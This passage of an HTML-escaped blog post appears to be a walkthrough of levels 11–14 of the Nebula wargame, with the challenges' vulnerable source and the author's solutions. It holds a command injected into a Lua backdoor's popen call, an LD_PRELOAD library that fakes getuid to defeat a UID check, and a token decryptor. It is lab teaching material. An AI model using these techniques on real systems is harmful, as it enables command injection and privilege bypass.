      &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;fread length&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;process(buf,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;blue&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pink;&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getrand(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;path);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(blue&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;blue = %d, length = %d, &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;blue,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length);&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;pink&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fread(buf,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;stdin);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;pink = %d&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pink);&lt;/span&gt;

      &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(pink&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;fread fail(blue = %d, length = %d)&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;blue,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pink);&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;blue&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pink;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;  

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;mem&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;mmap(NULL,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;PROT_READ&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PROT_WRITE,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MAP_PRIVATE,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(mem&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MAP_FAILED)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;mmap&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;process(mem,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I&amp;rsquo;ll be honest with you and admit that I had a lot of trouble with this. I eventually looked up how to do this on other blogs, but still couldn&amp;rsquo;t get it to work. After some searching I believe it&amp;rsquo;s down to the bash version my VM is running. The exploit was possible due to some feature in older versions of bash, but not in the version I have. If you would like to read how to get level 11 you can do so here: &lt;a href=&#34;http://www.kroosec.com/2012/11/nebula-level11.html&#34;&gt;http://www.kroosec.com/2012/11/nebula-level11.html&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;level-12:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;level 12&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;require(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;socket&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;server&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;assert(socket.bind(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;50001&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;))&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hash(password)&lt;/span&gt; 
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;prog&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;io.popen(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;echo &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;..password..&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot; | sha1sum&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;prog:read(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;*all&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;prog:close()&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string.sub(data,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;end&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;client&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;server:accept()&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;client:send(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Password: &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;client:settimeout(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;line,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;client:receive()&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;then&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;print(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;trying &amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;..&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;line)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;log&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;\
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hash(line)&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;~=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;then&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;client:send(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Better luck next time&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;client:send(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Congrats, your token is 413**CARRIER LOST**&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;end&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;end&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;client:close()&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we need to connect to the localhost on port 50001 and enter the correct password. the password is whatever the hash is in plain text. But even if we get it right you can see that we don&amp;rsquo;t get our token. With a specially crafted password however, we can make use of the &lt;code&gt;io.popen&lt;/code&gt; call.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level12@nebula:/home/flag12$ nc localhost 50001
Password: hello &amp;amp;&amp;amp; getflag &amp;gt; /tmp/out
Better luck next time
level12@nebula:/home/flag12$ cat /tmp/out
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-13:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Level 13&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;#define FAKEUID 1000&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;token[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(getuid()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;FAKEUID)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Security failure detected. UID %d started us, we expect %d&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getuid(),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;FAKEUID);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;The system administrators will be notified of this violation&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #75715e&#34;&gt;// snip, sorry :)&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;your token is %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;token);&lt;/span&gt;
  
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Here we need to fake our UID. Sounds tricky. Actually, we don&amp;rsquo;t fake our UID, we fake the call to &lt;code&gt;getuid&lt;/code&gt;. How?
&lt;code&gt;getuid&lt;/code&gt; is called from a library, which means we are able to replace it with our own library. Let&amp;rsquo;s take a look at
the function definition of &lt;code&gt;getuid&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;GETUID(2)                  Linux Programmer&amp;#39;s Manual                 GETUID(2)

NAME
       getuid, geteuid - get user identity

SYNOPSIS
       #include &amp;lt;unistd.h&amp;gt;
       #include &amp;lt;sys/types.h&amp;gt;

       uid_t getuid(void);
       uid_t geteuid(void);
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ok, so let&amp;rsquo;s write our verison of:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;uid_t&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;getuid&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1000&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;and compile it as a shared library which we then preload (see &lt;code&gt;man ld.so&lt;/code&gt; for more info on this). We need to
copy the &lt;code&gt;flag13&lt;/code&gt; binary to our local directory because it needs to be run as the same user level as the
library we are trying to preload.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level13@nebula:/tmp$ gcc -shared -fPIC fake.c -o fetgetuid.so
level13@nebula:/tmp$ cp ~flag13/flag13 .
level13@nebula:/tmp$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export LD_PRELOAD&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;/tmp/fetgetuid.so
level13@nebula:/tmp$ ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:/tmp$ ssh flag13@localhost
flag13@localhost&amp;#39;s password: b705702b-76a8-42b0-8844-3adabbe5ac58
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-14:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Level 14&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The contents of &lt;code&gt;token&lt;/code&gt; were encrypted using the &lt;code&gt;flag14&lt;/code&gt; binary in &lt;code&gt;~flag14&lt;/code&gt;. If you run it you can see how it works. Let&amp;rsquo;s enter something and see if we can work out how it works. I created a file with the contents &lt;code&gt;abcdefghijklmno&lt;/code&gt; in &lt;code&gt;/tmp/test&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; level14@nebula:/home/flag14$ cat /tmp/test | ./flag14 -e
acegikmoqsuwy{}level14@nebula:/home/flag14$
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So luckily it&amp;rsquo;s fairly straightforward, it offsets each letter by the value of its position in the string. A quick Python script can reverse the process.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; &lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;decrypt&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(input):&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;enumerate(input):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;dec&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ord(c)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chr(dec)&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;out&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;__name__&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;input&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;decrypt(input)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

